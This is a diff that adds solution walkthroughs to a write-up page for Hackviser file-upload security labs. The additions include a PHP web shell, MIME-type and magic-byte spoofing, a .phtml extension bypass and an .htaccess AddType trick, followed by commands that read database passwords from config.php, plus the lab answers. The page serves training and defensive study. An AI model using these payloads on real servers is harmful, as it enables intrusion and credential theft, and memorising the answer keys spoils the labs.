@@ -48,22 +48,93 @@ prog: 'Hackviser Web Application Security Labs  -  March 2026'
 
 <h5 class="mb-2"><strong>2. MIME Type Filter Bypass</strong></h5>
 <p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the Mime-Type. To complete the lab, upload a malicious PHP script by changing the Mime-Type and read the "config.php" file. What is the database password in the config.php file?</p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3">We will create a simple PHP web shell using the following:</p>
+
+```PHP
+<?php system($_GET['cmd']); ?>
+```
+
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image4.png" alt="Web Application Security Unrestricted File Upload 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">We choose the webshell.php as the file, enable proxy in BurpSuite to intercept the request, and click Upload.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image5.png" alt="Web Application Security Unrestricted File Upload 5" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Notice the HTTP POST Request. We change <code>Content-Type: application/octet-stream</code> to <code>Content-Type: image/jpeg</code>.</p>
+
+```HTTP
+------WebKitFormBoundarygE19LYt70KMqcH4G
+Content-Disposition: form-data; name="input_image"; filename="webshell.php"
+Content-Type: image/jpeg
+```
+
+<p class="mb-3">Once we forward the HTTP POST Request, we access the URL of the successfully uploaded file.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image6.png" alt="Web Application Security Unrestricted File Upload 6" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">We append <code>?cmd=find / -name "config.php"</code> to the end of the URL and we press Enter.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image7.png" alt="Web Application Security Unrestricted File Upload 7" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Now to get the database password, we append <code>?cmd=grep password /var/www/html/config.php</code> to the end of the URL and press Enter.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image8.png" alt="Web Application Security Unrestricted File Upload 8" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> fRqs3s79mQxv6XVt</p>
 <br />
 
 <h5 class="mb-2"><strong>3. File Signature Filter Bypass</strong></h5>
 <p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file signature (a.k.a magic bytes). To complete the lab, upload a malicious PHP script by manipulating the file signature and read the "config.php" file. What is the database password in the config.php file?</p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3">In a Linux terminal, run the following commands to create a webshell:</p>
+
+```Bash
+user@linux:~$ printf "\xFF\xD8\xFF<?php system(\$_GET['cmd']); ?>" > webshell.php
+user@linux:~$ file webshell.php
+webshell.php: JPEG image data
+```
+
+<p class="mb-3">Then upload the webshell. It should mention that the file upload is successful.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image9.png" alt="Web Application Security Unrestricted File Upload 9" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Accessing the URL of the uploaded file shows the following:</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image10.png" alt="Web Application Security Unrestricted File Upload 10" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Appending <code>?cmd=grep password /var/www/html/config.php</code> to the end of the URL and pressing Enter reveals the password.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image11.png" alt="Web Application Security Unrestricted File Upload 11" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> 2xESbdzvegfahykF</p>
 <br />
 
 <h5 class="mb-2"><strong>4. File Extension Filter Bypass</strong></h5>
 <p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Many file extensions that are dangerous to upload are included in this blacklist. To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file. What is the database password in the config.php file?</p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3">We create a webshell with extension <code>.phtml</code> with the following payload:</p>
+
+```PHP
+<?php system($_GET['cmd']); ?>
+```
+
+<p class="mb-3">Uploading the webshell should be successful.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image12.png" alt="Web Application Security Unrestricted File Upload 12" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">When we access the URL of the uploaded webshell, we see the following:</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image13.png" alt="Web Application Security Unrestricted File Upload 13" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">To obtain the password, we append <code>?cmd=grep password /var/www/html/config.php</code> to the end of the uploaded webshell URL.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image14.png" alt="Web Application Security Unrestricted File Upload 14" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> Qr3eydwjjZmPpwVm</p>
 <br />
 
 <h5 class="mb-2"><strong>5. File Extension Improved Filter Bypass</strong></h5>
 <p class="mb-3">This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Almost all file extensions that are dangerous to upload are included in this blacklist. To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file. What is the database password in the config.php file?</p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3">We create a file named webshell.php.cyber using the following payload:</p>
+
+```PHP
+<?php system($_GET['cmd']); ?>
+```
+
+<p class="mb-3">In the browser, we select the file webshell.php.cyber as the file to be uploaded, enable Burp Suite Intercept mode, and click Upload. Then we return to Burp Suite and modify the HTTP POST request as the following:</p>
+
+```HTTP
+------WebKitFormBoundaryt21MB0GnocwUNSXD
+Content-Disposition: form-data; name="input_image"; filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .cyber
+``` 
+
+<p class="mb-3">The idea is to rename the file to <code>.htaccess</code>, and add the <code>AddType application/x-httpd-php .cyber</code> line in the request.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image15.png" alt="Web Application Security Unrestricted File Upload 15" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Then we forward the request and turn off the Intercept. We should see that the upload is successful and the file name is shown as '.htaccess' in the browser.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image16.png" alt="Web Application Security Unrestricted File Upload 16" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">To obtain the password of the database, we navigate to the URL of the uploaded file. But this will make us try to read the .htaccess file which will return HTTP 403 Forbidden. To access our webshell and execute commands, we need to replace <code>/.htaccess</code> to <code>/webshell.php.cyber?cmd=grep password /var/www/html/config.php</code> via the URL.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image17.png" alt="Web Application Security Unrestricted File Upload 17" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> T9n3j6EnMRy2gPAC</p>
 
 
 <hr />
